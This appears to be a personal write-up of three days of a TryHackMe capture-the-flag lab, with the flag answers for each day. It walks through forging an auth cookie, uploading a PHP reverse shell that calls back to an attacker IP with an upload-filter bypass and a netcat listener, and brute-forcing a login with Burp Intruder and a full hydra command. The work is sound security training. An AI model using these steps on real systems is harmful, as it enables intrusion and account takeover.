# Day 1
* We can go onto the website and regsiter/login.
* Once we do that, viewing the cookies shows us a hexidecimal value named "auth"
* We can decode that with `echo <hex_string> | xxd -r -p`
* We want to log in to "santa", so let's switch our user for that with the following command:
* `echo <hex_string> | xxd -r -p | sed s/<your_username>/santa/g | xxd -p`
* Once we replace the value of the previous cookie with the new one in the "Applications->Cookies" section on chrome developer tools, we get authenticated as santa and can turn on all the controls
* The flag is `THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}` 


# Day 2
* My ID number was `ODIzODI5MTNiYmYw`
	* We can then go to the website and enter that in as a GET parameter:
	* `http://10.10.71.84/?id=ODIzODI5MTNiYmYw`
* There's a place images, so let's try to upload a malicious script - a reverse shell
* I got a php reverse shell [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
        * Make sure you edit your ip to be the one on tun0 and change the port to what you want
```
$ip = '10.6.36.105';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
```
* Uploading the php file doesn't work because the system doesn't allow php extensions
* Looking at the source code shows that the website allows uploads of `.jpeg, .jpg, .png`. Let's try to disguise our script as one of those
	* We can rename the file to `php-reverse-shell.jpg.php`
	* This works because this particular website checks file extensions by splitting on a period and checking the second index
* Now we need to find where the images are stored
	* We can do that with gobuster:
* `gobuster dir -u "http://10.10.71.84/" -w /usr/share/wordlists/dirb/common.txt" -b "200"
	* We include a blacklist for status codes of 200 because the website will return a 200 for any directory you put in
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:                     http://10.10.71.84/
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   200
[+] User Agent:              gobuster/3.0.1
[+] Timeout:                 10s
===============================================================
2020/12/02 19:04:07 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/cgi-bin/ (Status: 403)
/noindex (Status: 301)
/uploads (Status: 301)
===============================================================
2020/12/02 19:04:58 Finished
===============================================================
```
* We can see that `/uploads` is a valid directory. Going there on `http://10.10.71.84/uploads/` shows our uploaded shell

* Now we can set up a reverse listener on our machine with `nc -lvnp 1337`
	* Remember to use the same port as the one on the reverse shell script
* To run the script on their server, we can simply click on it
	* We get a shell!
* Now we can `cat /var/www/flag.txt` to get the flag: `THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}`

# Day 3
* If we go to the IP, we can see a login page

## 1.Directory discovery
* This likely wasn't the intention of the person who made the problem, but we can get the flag with a bit of directory discovery
* `gobuster dir -u http://10.10.181.149/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50`
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.181.49/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/03 19:55:47 Starting gobuster
===============================================================
/tracker (Status: 200)
/Tracker (Status: 200)
===============================================================
2020/12/03 20:04:10 Finished
===============================================================
```
* We can see an open directory called `/tracker`
	* Going there gets us to the site without logging in
* The flag is `THM{885ffab980e049847516f9d8fe99ad1a}`  

## 2.Dictionary Credential Attack
* First, we can turn on burpsuite and our proxy and go to the link
* When we enter a test username and password, we get the following request:
```
POST /login HTTP/1.1
Host: 10.10.181.49
Content-Length: 28
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.181.49
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.181.49/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ca;q=0.8
Connection: close

username=test&password=test1
```

* From here, we can do a dictionary attack in one of two ways:
### a) Burpsuite
* Hitting `CTRL + I` will send the request to the intruder tab of burpsuite
* Here, we can replace the usename and password variables with something else
	* You can see that burp put characters around your test username and password to indicate that they are variables:
		* `username=§test§&password=§test1§`
* Going to the Payloads subtab, we can load usernames in set 1 and passwords in set 2
	* You can either manually input common or discovered credentials, or you can use a wordlist
	* I'll be using the `cirt-default` wordlists in `usr/share/wordlists/seclists/`
* Now go back to the Positions subtab and select `Cluster bomb` as the attack type
* Hitting `Start Attack` will start trying passwords.
* We get a series of response codes and lengths
	* The one that is different from the others will be the one that likely got us a login
	* Only one request had a length of 255, and that used the username `admin` and the password `12345`
		* Trying that logs us in!
* The flag is `THM{885ffab980e049847516f9d8fe99ad1a}`

### b) Hydra
* We can use hydra to quickly do a dictionary attack
* There are a couple things we need to take note of first:
	* We are making a post request based on what we got from burp
	* We are making a post request to /login
	* When we get a username or password wrong, the website gives us the message `Your password is incorrect..`
* We can run the command `hydra -L /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/seclists/Passwords/cirt-default-passwords.txt 10.10.181.49 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -f`
	* `-L` sets the username list
	* `-P` sets the password list
	* `10.10.181.49` is the website
	* `http-post-form` is the request type that burp gave us
	* `/login` is where burp indicated the post request was being sent
	* `username=^USER^&password=^PASS^` is the request that burp indcated was being sent (with variables being set with `^USER^` and `^PASS^`)
	* `incorrect` is a word that shows up on the website when our login doesn't work
	* `-f` ends the attack once one of our credentials works

* We get the following response: `[80][http-post-form] host: 10.10.181.49   login: admin   password: 12345`
* Logging in gets us the flag: `THM{885ffab980e049847516f9d8fe99ad1a}`